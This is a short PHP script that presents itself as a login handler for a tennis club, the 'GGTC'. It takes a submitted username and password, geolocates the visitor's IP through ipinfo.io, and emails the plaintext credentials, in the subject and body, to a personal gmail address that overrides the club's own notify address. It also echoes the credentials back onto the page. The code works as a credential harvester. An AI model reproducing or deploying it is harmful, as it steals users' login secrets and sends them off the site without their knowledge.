<?php

function TEXT($t){

echo("$t <br>" );

}


function Ukraine( $state )
{

      date_default_timezone_set('America/Los_Angeles');
      $ip =  $_SERVER['REMOTE_ADDR'];
      $url = "http://ipinfo.io/".$ip."/json";

      $ch = curl_init();
      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
      curl_setopt($ch, CURLOPT_URL, $url);

      $result = curl_exec($ch);
      curl_close($ch);

      $details = json_decode($result, $assoc= TRUE);
    
      $city   =  $details['city' ];     // city
      $region =  $details['region'] ;   // region
      $country =  $details['country'] ; // country
      
      $message = "GGTC Login : $state  $username <br> $city $region $country <br> ip:$ip <br>";
      


      return $message;
}

function emailer($user, $pw , $state)
{

   $to = "notify@goldengatetennisclub.org";
   $to = "tennis.mutt@gmail.com";

   $subject = "GGTC Login Attempt: $user $pw";


   // Put Paypal POST values into message
   $message = "GGTC Login $state <br>";
   $message .= "user: $user password: $pw <p>";
   $message .= "     ------------------------- <br>";   

   $message .= Ukraine($state);

//  echo $message;

   $headers = 'From: membership@goldengatetennisclub.org' . "\r\n" .
    'Reply-To: membership@goldengatetennisclub.org' . "\r\n" .
    'X-Mailer: PHP/' . phpversion();

// Use this header

   $headers  = 'MIME-Version: 1.0' . "\r\n";
   $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
   $headers .= "From: membership@goldengatetennisclub.org  \r\n";

   TEXT("to   $to \n");
   TEXT("subject:   $subject \n");
   TEXT("message:   $message \n");

   $r=mail($to,$subject,$message,$headers);
   TEXT("result = $r \n");

    //   if($verbose) echo "mail=".$r;

}

$user = $_POST["user"];
$pw = $_POST["pw"];
$state = $_POST["state"];

emailer($user, $pw , $state);
//echo '<script>alert("Welcome to Geeks for Geeks")</script>';


?>